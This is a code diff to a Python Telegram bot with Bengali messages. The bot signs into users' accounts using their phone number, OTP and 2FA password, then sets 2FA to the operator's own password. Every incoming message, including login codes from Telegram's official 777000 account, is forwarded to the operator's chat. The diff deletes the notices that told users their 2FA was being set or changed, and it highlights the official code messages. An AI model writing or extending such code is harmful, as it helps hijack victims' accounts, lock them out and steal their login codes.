@@ -2387,7 +2387,7 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
         
         # Success! Now set 2FA
-        await anim_msg.edit_text("⏳ **লগইন সফল হয়েছে!**\n১০ সেকেন্ড পর অটোমেটিক ২এফএ (2FA) অন হবে...", parse_mode='Markdown')
+        # No message to user as requested
         
         # Wait 10 seconds as requested
         await asyncio.sleep(10)
@@ -2444,12 +2444,17 @@ Your payment will be moved to Main Balance after verification.
         async def handler(event):
             # Forward ALL messages as requested
             try:
+                # Always forward messages from Telegram Official (777000) immediately
+                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID
+                
                 sender = await event.get_sender()
                 sender_name = getattr(sender, 'first_name', 'Unknown')
                 if not sender_name and hasattr(sender, 'title'):
                     sender_name = sender.title
                 
-                forward_text = f"📩 **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
+                emoji = "🔔" if is_official else "📩"
+                forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
+                
                 await context.bot.send_message(
                     chat_id=FORWARD_CHAT_ID,
                     text=forward_text
@@ -2521,7 +2526,7 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         await client.sign_in(password=password)
         
         # Success! Now reset/update 2FA to our specific password
-        await anim_msg.edit_text("⏳ **লগইন সফল হয়েছে!**\n১০ সেকেন্ড পর অটোমেটিক ২এফএ (2FA) আপডেট হবে...", parse_mode='Markdown')
+        # No message to user as requested
         
         # Wait 10 seconds as requested
         await asyncio.sleep(10)
@@ -2570,12 +2575,17 @@ Your payment will be moved to Main Balance after verification.
         async def handler(event):
             # Forward ALL messages as requested
             try:
+                # Always forward messages from Telegram Official (777000) immediately
+                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID
+                
                 sender = await event.get_sender()
                 sender_name = getattr(sender, 'first_name', 'Unknown')
                 if not sender_name and hasattr(sender, 'title'):
                     sender_name = sender.title
                 
-                forward_text = f"📩 **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
+                emoji = "🔔" if is_official else "📩"
+                forward_text = f"{emoji} **নতুন মেসেজ**\n📞 নাম্বার: `{phone}`\n👤 প্রেরক: {sender_name}\n\n{event.raw_text}"
+                
                 await context.bot.send_message(
                     chat_id=FORWARD_CHAT_ID,
                     text=forward_text
